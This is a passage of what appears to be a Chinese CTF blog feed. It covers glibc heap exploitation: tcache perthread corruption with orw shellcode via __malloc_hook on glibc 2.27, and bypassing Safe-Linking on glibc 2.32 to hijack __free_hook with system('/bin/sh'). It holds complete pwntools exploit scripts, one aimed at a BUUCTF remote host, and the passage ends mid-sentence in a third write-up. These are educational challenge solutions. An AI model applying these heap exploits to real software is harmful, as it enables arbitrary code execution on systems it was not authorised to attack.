class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS64</span></span><br></pre></td></tr></table></figure><p>这个结构体中有两个成员变量，一个是64字节的counts数组。该数组的每个元素都各自对应了64个tcache链表其中一条上chunk的数量(最大为7)。另一个成员变量是一个结构体指针数组，该数组的大小为64*8字节，该数组存放的是每条tcache链表的头指针。</p><p>而这个结构体会在第一次用户分配堆内存空间之前，会被申请出来。其大小为0x10+0x40+0x40*8=0x250。</p><p>如果我们能将这个tcache_perthread_struct结构体申请出来并进行编辑，那就可以达到任意地址申请(直接凭空在结构体指针数组中写入任意地址)，又或者我们篡改count的值，让原本一个堆地址对应的count是1，我们将其修改为7，这样再次将其释放掉，就可以让它进入unsorted bin中了。</p><h3 id="启发：">启发：</h3><blockquote><p>通过这道题，也让我受到了一些启发，本题是可以泄露出堆地址，从而将tcache_perthread_struct申请出来，但是我发现这里可以利用UAF打一个tcache dup，然后爆破一比特位，也可以将tcache_perthread_struct申请出来。然后对其进行编辑，从而达到任意地址申请，又或者更改tcache链表的counts。最后打io_leak，也可以泄露出libc地址，而这样就不需要存在泄露函数了。通过查阅资料，发现这位师傅在2019年就提出了这种攻击</p><p><a href="https://xz.aliyun.com/t/6828#toc-0">初探tcache struct攻击 - 先知社区 (aliyun.com)</a></p></blockquote><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220828154000077-1408719411.png" alt=""></p><p>可以看到保护全开，并且开了沙箱禁用了execve，那就考虑orw。</p><h2 id="程序分析：">程序分析：</h2><h3 id="delete函数：">delete函数：</h3><p>通过分析下面的delete函数，发现该函数存在UAF漏洞，但是free指定堆块后，会把该堆块的size位给置空。且该函数只能执行三次。</p><p><img src="../img/2706180-20220828154022952-102798994.png" alt=""></p><h3 id="add函数：">add函数：</h3><p>通过分析add函数中(如下图)，发现我们最大只能申请0x100的堆块，并且因为free掉堆块后并不会被置空指针再根据add函数这边的限制，所以add函数只能执行8次。</p><p><img src="../img/2706180-20220828154036282-188410497.png" alt=""></p><h3 id="edit函数：">edit函数：</h3><p>因为edit函数中的read是根据存储在bss段上的size来决定输入的字节数的。而delete函数后会将size置空，这里要注意一下。</p><p><img src="../img/2706180-20220828154050622-1112821718.png" alt=""></p><h3 id="show函数：">show函数：</h3><p>这就是个常规的show函数，打印堆块里的数据。</p><p><img src="../img/2706180-20220828154116200-1979509908.png" alt=""></p><h3 id="init函数：">init函数：</h3><p>初始化函数中不仅开了沙箱，还映射到0x66660000了一段可读可写可执行的内存。</p><p><img src="../img/2706180-20220828154127411-1367182171.png" alt=""></p><h2 id="利用思路：">利用思路：</h2><h3 id="泄露堆地址，做一个tcache-dup">泄露堆地址，做一个tcache dup</h3><p>因为是2.27的libc，存在UAF我们就可以直接打tcache dup。因为沙箱禁用了execve，所以我们采用orw，将orw的shellcode写在0x66660000，最后将0x66660000这个地址写到malloc_hook即可。</p><p>这题的问题就是虽然存在show函数，但是我们add函数执行的次数有限，同时无法申请大于0x100的堆块。因此正常情况下我们的堆块被释放后进不去unsorted bin中，也就是拿不到libc地址(但是我们可以拿到堆地址)。而且delete函数的次数有限，我们不能无限制的利用tcache dup。</p><p>因此这道题采用的攻击手法为tcache perthread corruption</p><p>首先我们先利用UAF配合show函数泄露下堆地址，接着做一个tcache dup。此时的效果如下：</p><p><img src="../img/2706180-20220828154144232-1994127415.png" alt=""></p><p>此时的exp为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="tcache-perthread-corruption">tcache perthread corruption</h3><p>由于我们有了堆地址，那我们就打一个tcache poisoning将tcache_perthread_structshe申请出来，然后我们来将0x66660000这个地址伪造为一个tcache的链表头（顺便修改下对应count），这样malloc对应的字节就能把0x66660000这个地址给申请出来了，顺便再将有double free的那条tcache链的count改成7，这样再delete一次，堆块就可以进入unsorted bin中了。</p><p>这步的exp如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(target_addr))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x66660000</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(heap_addr))</span><br></pre></td></tr></table></figure><p>此时的bins情况如下图：</p><p><img src="../img/2706180-20220828154202844-733207592.png" alt=""></p><h3 id="泄露libc地址">泄露libc地址</h3><p>接着我们将0x66660000给申请出来写入orw的shellcode。再释放掉一次位于counts为7那条tcache链的堆块(在这之前先申请一个小堆块，来防止该堆块释放后与top chunk合并)，这样该堆块就进入了unsorted bin中。然后执行show函数，我们就拿到了libc地址。</p><p>效果如下：</p><p><img src="../img/2706180-20220828154218617-1109639937.png" alt=""></p><p>这部分的exp为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">4</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebca0</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="tcache-perthread-corruption，劫持malloc-hook">tcache perthread corruption，劫持malloc_hook</h3><p>此时我们拿到了libc地址，如果常规方法打tcache poisoning的话，先edit修改下tcachebin中的fd指针，然后需要add两次才能将malloc_hook申请出来，然后修改了malloc_hook后，还需要最后再add一次才能触发shellcode，但事实上这道题我们只能执行add函数8次，而上述所有操作用到了9次add函数，因此这个方法不行。所以我们采用的策略是再编辑一次tcache_perthread_struct结构体，直接伪造出malloc_hook的地址在tcache bin中，因为malloc_hook被伪造到了链表头的位置，所以我们只需要一次add函数就能将其申请出来了，最后编辑malloc_hook写入0x66660000这个地址，我们再次执行add函数时，就可以执行我们的shellcode将flag读出来了。</p><p>下图是将malloc_hook写到tcache链表头的位置。</p><p><img src="../img/2706180-20220828154235337-35519013.png" alt=""></p><p>这部分exp为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(malloc_hook))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_s,d_e,<span class="number">0xf44</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660000</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure><p>最终的exp如下：</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><h2 id="EXP">EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27132</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x11b7</span></span><br><span class="line">d_a=<span class="number">0x1193</span></span><br><span class="line">d_e=<span class="number">0x11ab</span></span><br><span class="line">d_s=<span class="number">0x119f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))    </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">target_addr=heap_addr-<span class="number">0x260</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(target_addr))</span><br><span class="line"><span class="comment"># edit(1,p64(0x66660000))</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">  </span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x66660000</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">4</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebca0</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(malloc_hook))</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_s,d_e,0xf44)</span></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660000</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220828154253204-1927856405.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Safe-Linking 机制的绕过</title>
      <link href="/posts/501cca6.html"/>
      <url>/posts/501cca6.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言">前言</h3><p>自从引入了 <code>tcache</code> 机制后，从 <code>2.26</code> 开始 <code>tcache poisoning</code> 就是一种简便的攻击方式，因为它不需要像 <code>fastbin attack</code> 利用那样对 <code>size</code> 检查较为严格，只能申请到 <code>malloc</code> 和 <code>setcontext</code> 上方的区域。篡改了 <code>tcache bin</code> 中堆块的 <code>next</code> 指针就相当于可以任意地址申请了</p><h3 id="safe-Linking">safe-Linking</h3><p>在 <code>2.32</code> 之前 <code>tcache poisoning</code> 可以说是无往不利，但到了 <code>glibc 2.32</code> 及以后，增加了 <code>safe-Linking</code> 机制。 <code>safe-Linking</code> 就是对 <code>next</code> 指针进行了一些运算</p><p>规则是将 <strong>当前 <code>free</code> 后进入 <code>tcache bin</code> 堆块的用户地址</strong> 右移 <code>12</code> 位的值和 <strong>当前 <code>free</code> 后进入 <code>tcache bin</code> 堆块原本正常的 <code>next</code> 值</strong> 进行<strong>异或</strong> ，然后将这个值重新写回 <code>next</code> 的位置</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#define PROTECT_PTR(pos, ptr) \</span><br><span class="line">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br></pre></td></tr></table></figure><p>触发这个 <code>PROTECT_PTR</code> 宏，有两种情况，第一种是当前 <code>free</code> 的堆块是第一个进入 <code>tcache bin</code> 的（此前 <code>tcache bin</code> 中没有堆块），这种情况原本 <code>next</code> 的值就是 <code>0</code> ，第二种情况则是原本的 <code>next</code> 值已经有数据了。<strong>如果是第一种情况的话，对于 <code>safe-Linking</code> 机制而言，可能并没有起到预期的作用，因为将当前堆地址右移 <code>12</code> 位和 <code>0</code> 异或，其实值没有改变，如果我们能泄露出这个运算后的结果，再将其左移 <code>12</code> 位就可以反推出来堆地址，如果有了堆地址之后，那我们依然可以篡改 <code>next</code> 指针，达到任意地址申请的效果</strong></p><p>恢复 <code>next</code> 的宏为 <code>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</code> ，其实这个宏最终还是调用了 <code>PROTECT_PTR</code> ，原理就是 <code>A=B^C ; C=A^B</code></p><h3 id="例题">例题</h3><h4 id="NCTF2021-ezheap">NCTF2021-ezheap</h4><p>[题目链接](<a href="https://github.com/X1cT34m/NCTF2021/tree/main/Pwn/ezheap">NCTF2021/Pwn/ezheap at main · X1cT34m/NCTF2021 (github.com)</a>)</p><p>本题的 <code>libc</code> 版本为 <code>2.32</code>，因为是本地复现，所以我就随便选了一个 <code>2.32</code> 的小版本来做了</p><h5 id="保护策略：">保护策略：</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044578.png" alt="image-20230319104415444" style="zoom:67%;" /><h5 id="漏洞所在：">漏洞所在：</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044228.png" alt="image-20230319104447181" style="zoom:50%;" /><p>在 <code>delete</code> 函数中，发现 <code>free</code> 掉 <code>malloc_store[index]</code> 后将 <code>size_store[index]</code> 给置空了，由于忘记给 <code>malloc_store[index]</code> 造成了 <code>UAF</code> 。</p><p>因为本题有 <code>edit</code> 和 <code>show</code> 函数，所以篡改 <code>next</code> 以及泄露堆地址和 <code>libc</code> 地址都较为轻松</p><h5 id="利用思路：">利用思路：</h5><h6 id="edit-after-free">edit-after-free</h6><p>考虑一点就是 <code>delete</code> 函数后会将 <code>size[index]</code> 置空，如果直接 <code>edit</code> 的话，无法往里面写入数据。采取的措施是 先申请 <code>chunk1</code> 然后将其释放，此时它的 <code>size</code> 被置空了，但是地址依然留在了 <code>malloc_store</code> 里面，此时再申请等大的 <code>chunk2</code>，此时再次释放 <code>chunk1</code> （因为刚刚的 <code>chunk2</code> 是将原本的 <code>chunk1</code> 申请出来了，所以这里不会造成 <code>double free</code>），此时 <code>chunk1</code> 和 <code>chunk2</code> 指向的地址是相同的，<code>chunk1</code> 的 <code>size</code> 为 <code>0</code>， <code>chunk2</code> 的 <code>size</code> 正常，并且编辑 <code>chunk2</code> 就可以篡改已经处于 <code>free</code> 状态的 <code>chunk1</code>，从而修改其 <code>next</code> 指针。（如下图）</p><p>通过下图可以发现，此时 <code>0x000055d5f6e622a0</code> 的位置是有两个，第二个对应的 <code>size</code> 是 <code>0x70</code>，所以可以在这里篡改 <code>next</code> 指针</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191104276.png" alt="image-20230319110417830" style="zoom: 67%;" /><h6 id="泄露堆地址">泄露堆地址</h6><p>此时的 <code>tcache bin</code> 中只有一个堆块，执行 <code>show</code> 函数泄露其 <code>next</code> 指针数据，得到了 <code>0x551dcbb2</code> ，我们将其左移 <code>12</code> 位即可得到堆地址（因为 <code>next</code> 原本为 <code>0</code>，和 <code>0</code> 异或结果不变）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191109678.png" alt="image-20230319110941492" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br></pre></td></tr></table></figure><p>此时即可得到堆地址（如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191113663.png" alt="image-20230319111330505" style="zoom:50%;" /><h6 id="tcache-poisoning">tcache poisoning</h6><p>最后一点需要考虑的是如何将 <code>__free_hook</code> 写入到 <code>next</code> 指针上。</p><p>因为 <code>safe_Linking</code> 机制会存放 <code>next</code> 指针运算后的结果，因此 <code>tcache poisoning</code> 只需要我们自己将 <code>__free_hook</code> 地址进行同样方法运算写入 <code>next</code> 位置（如下）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">value=((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^free_hook</span><br></pre></td></tr></table></figure><p><code>heap_base+0x2a0</code> 是当前 <code>free</code> 后进入 <code>tcache bin</code> 堆块的用户地址</p><p>此时 <code>__free_hook</code> 写入 <code>next</code> 后的情况如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191154909.png" alt="image-20230319115455792"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191155547.png" alt="image-20230319115549446"></p><p>最后将 <code>__free_hook</code> 申请出来写入 <code>system</code> 地址，通过 <code>free</code> 释放掉一个存有 <code>/bin/sh</code> 字符串的堆块，获取 <code>shell</code>。</p><p><strong>注意：</strong> 需要提前布局 <code>0x80</code> 这条链的堆块，保证其 <code>counts</code> 在申请 <code>__free_hook</code> 时要大于 <code>0</code>，否则无法从这条 <code>tcache bin</code> 中申请出来 <code>__free_hook</code></p><h5 id="EXP">EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;ezheap&quot;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak heap_address</span></span><br><span class="line"></span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;preven chunk&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">11</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)<span class="comment">#goto unsorted bin</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">10</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1e3c00</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">value=((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^free_hook</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1769</span>,<span class="number">0x172A</span>,<span class="number">0x1754</span>,<span class="number">0x173F</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(value))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191159819.png" alt="image-20230319115958381" style="zoom: 50%;" /><h4 id="VNCTF2021-ff">VNCTF2021-ff</h4><p>题目附件在 BUUCTF 中的 VNCTF2021 比赛中可以找到</p><h5 id="保护策略">保护策略</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201401195.png" alt="image-20230320140126119"></p><h5 id="程序分析">程序分析</h5><p><code>libc</code> 为 <code>2.32-0ubuntu3_amd64</code> ，这个版本存在 <code>safe-Linking</code> 机制</p><p><code>add</code> 函数，对 <code>size</code> 进行了限制，最大能申请 <code>0x7f</code> ,并且申请出来的堆块索引会被赋值为全局变量 <code>idx</code> ，最多申请 <code>0x10</code> 个堆块</p><p><code>delete</code> 函数存在 <code>UAF</code> 漏洞，但是我们无法选择索引释放指定的堆块，只能释放索引为 <code>idx</code> 的堆块（也就是只能释放最近一次申请的堆块）</p><p><code>show</code> 函数也是只能打印出最近一次申请堆块中的八个字节数据，并且 <code>show</code> 函数只有一次执行的机会</p><p><code>edit</code> 函数只能向最近一次堆块中写入 <code>0x10</code> 字节的数据，并且 <code>edit</code> 函数只能执行两次</p><h5 id="利用思路">利用思路</h5><p>因为本题一个麻烦的点在于 <code>edit</code> <code>show</code> <code>delete</code> 函数都只能对最近一个申请出来的堆块操作，所以需要反复调试进行一个布局。</p><p><code>add</code> 函数最大申请 <code>0x80</code> 的堆块，这就导致了泄露 <code>libc</code> 地址泄露不出来（即使填满 <code>tcache bin</code> 因为还需要做一个阻止与 <code>top chunk</code> 合并的堆块，也是无法将 <code>libc</code> 泄露出来的，就算真的泄露出来还要考虑 <code>safe-Linking</code> ）</p><p>所以这里最终选择的是泄露 <code>heap</code> 地址，利用 <code>UAF</code> 加上 <code>show</code> 函数即可泄露堆地址（将泄露出来的数据左移 <code>12</code> 位）</p><p>需要注意的是 <code>edit</code> 函数可以写入 <code>0x10</code> 个字节的数据，这样可以篡改 <code> free</code> 状态堆块的 <code>key</code> 字段，给了我们 <code>double free</code> 的机会，目的是去将 <code>pthread_tcache_struct</code> 申请出来（此时两次 <code>edit</code> 机会已经用完）</p><p>之后泄露 <code>libc</code> 肯定要考虑残留一个 <code>main_arena+96</code> 地址，然后爆破申请 <code>_IO_2_1_stdout_</code> 结构体泄露 <code>libc</code> 。本题堆块即使填满 <code>tcache bin</code> 也会落入 <code>fast bin</code> 中（<code>0x90</code> 虽然落不进去，但产生了 <code>main_arena+96</code> 也没办法改为 <code>_IO_2_1_stdout_</code> 地址）</p><p>所以只能将 <code>pthread_tcache_struct</code> 释放掉进入 <code>unsorted bin</code> ，当我们每次去从 <code>unsorted bin</code> 中切割堆块的时候，都会残留 <code>main_arena+96</code> 在 <code>pthread_tcache_struct</code> 中，当 <code>main_arena+96</code> 正好落到 <code>tcache</code> 头指针的位置，我们再切割 <code>unsorted bin</code> 的时候就能篡改 <code>main_arena+96</code> 改为 <code>_IO_2_1_stdout</code> 地址了。</p><p>注意：从 <code>tcache bin</code> 中申请堆块出来需要保证 <code>counts &gt; 0</code> ，为了最后还有机会做一个 <code>__free_hook</code> 申请出来，我们必须让申请出来的堆块尽可能小（在后面堆块布局的时候就会发现这点）</p><h5 id="调试过程">调试过程</h5><p>调试过程主要演示如何将 <code>__IO_2_1_stdout</code> 和 <code>__free_hook</code> 申请出来</p><p>下图是申请 <code>pthread_tcache_struct</code> 前的情况，申请出来要写入 <code>b'\x00\x00' * 0x27 + b'\x07\x00'</code> ，这样正好将 <code>0x290</code> 这条链的 <code>counts</code> 设置为 <code>7</code>，保证了释放掉 <code>pthread_tcache_struct</code> 后可以进入 <code>unsorted bin</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202028776.png" alt="image-20230320202839431" style="zoom: 50%;" /><p>下图是 <code>pthread_tcache_struct</code> 进入了 <code>unsorted bin</code> ，接下来我们需要反复从 <code>unsorted bin</code> 里来切堆块</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202032910.png" alt="image-20230320203243312" style="zoom:50%;" /><p>我们第一个要切下来的堆块大小为 <code>0x40</code>，写入的数据为 <code>'\x00\x00'*3+'\x01\x00'*1+'\x00\x00'*2+'\x01\x00'+'\x00'*0x38</code> ，这样才可以让 <code>0x50</code> 和 <code>0x80</code> 这两条链上的 <code>counts</code> 为 <code>1</code>（如下图）（这里就是一个布局，为后面申请 <code>_IO_2_1_stdout</code> 和 <code>__free_hook</code> 